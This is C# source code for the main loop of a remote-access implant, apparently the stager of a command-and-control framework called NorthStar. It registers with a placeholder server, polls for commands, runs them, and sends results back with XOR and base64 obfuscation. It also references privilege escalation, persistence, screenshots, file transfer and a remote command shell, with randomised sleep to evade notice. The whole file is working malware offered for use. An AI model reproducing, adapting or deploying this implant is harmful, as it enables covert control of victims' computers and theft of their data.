using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace NorthStarStager
{
    static class Globals
    {
        public static string mainUri = "http://URLHERE/";
        public static string resultSendUri = mainUri + "smanage.php";
        public static string commandRetrieveUri = mainUri + "smanage.php" + "?sid=";
        public static string registerFirstStageUri = mainUri + "login.php";
        public static string registerSecondStageUri = mainUri + "update.php";
        public static string fileUploadUri = mainUri + "getjuice.php";
        public static string fileDownloadUri = mainUri;
        public static string tempKey = "northstar";
    }
    class Program
    {

        static void Main(string[] args)
        {
          
            WebClient web = new WebClient();
            web.Proxy = WebRequest.GetSystemWebProxy();
            web.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            web.Credentials = CredentialCache.DefaultCredentials;

            initialEnum enumEnv = new initialEnum();
            privilegeEscalation privs = new privilegeEscalation();
            sendRetrieve sendOrRetrieve = new sendRetrieve();
            Chiper chipops = new Chiper();
            addPersistence persistence = new addPersistence();
            processCommand proc = new processCommand(enumEnv, privs, persistence);
            registerIn register;
         

            int waitTimeCounter = 0;
           

          
                register = new registerIn(enumEnv,chipops, web);
                if (register.isComplete)
                {
                    // persistence._copyItSelf();
                    string commandRetrieveUri = Globals.commandRetrieveUri  + chipops._base64encode(chipops._xorOps(enumEnv.clientID,"northstar"));
                  
                    while (true)
                    {

                    
                        string comm = sendOrRetrieve._getCommand(commandRetrieveUri, web, enumEnv, chipops);
            
                        if (!proc.cmdModeEnabled)
                        {

                            try
                            {
                                
                                if (comm.Length >= 2)
                                {
                                    if (comm == "die")
                                    {
                                        break;
                                    }
                                    waitTimeCounter = 0;

                                    string commandResult = proc._parseCommand(comm);

                                    if (!proc.wasScreenshot && commandResult.Length > 1)
                                    {
                                        sendOrRetrieve._sendResult(commandResult, web, enumEnv, chipops);
                                      
                                    }

                                    else
                                    {
                                        proc.wasScreenshot = false;
                                    }

                                }
                                else if (comm.Length < 2)
                                {
                                    waitTimeCounter++;
                                   
                                    if (waitTimeCounter > 40)
                                    {
                                        enumEnv.isWaitTimeManuallySetted = false;
                                        waitTimeCounter = 0;
                                    }
                                }

                            }
                            catch
                            {
                                System.Threading.Thread.Sleep(enumEnv.waitTime);
                            }
                            
                        }
                        else //if cmd mode enabled
                        {
                            if (comm.Length > 2)
                            {
                                if (comm == "exit" || comm == "break" || comm == "disablecmd")
                                {
                                    proc.cmdModeEnabled = false;
                                    sendOrRetrieve._sendResult("CMD mode disabled", web, enumEnv, chipops);
                                }
                            
                                else {
                                    if (comm.Contains("wait"))
                                    {
                                        sendOrRetrieve._sendResult(proc._parseCommand(comm), web, enumEnv, chipops);
                                    }
                                    else if(comm.Contains("cd ") && !comm.Contains("cd ,"))
                                    {
                                    sendOrRetrieve._sendResult(proc._parseCommand(comm), web, enumEnv, chipops);
                                     }
                                    else
                                    {
                                        proc._cmdMode(comm, sendOrRetrieve, enumEnv, web, chipops, commandRetrieveUri);
                                    }
                                }
                            }
                            else
                            {
                                waitTimeCounter++;
                                if (waitTimeCounter > 40)
                                {
                                    enumEnv.isWaitTimeManuallySetted = false;
                                    waitTimeCounter = 0;
                                }
                            }

                        }

                        System.Threading.Thread.Sleep(enumEnv.waitTime);
                        if (!enumEnv.isWaitTimeManuallySetted)
                            enumEnv.setRandomWaitTime();
                    }

            }
          
        }
    }
}
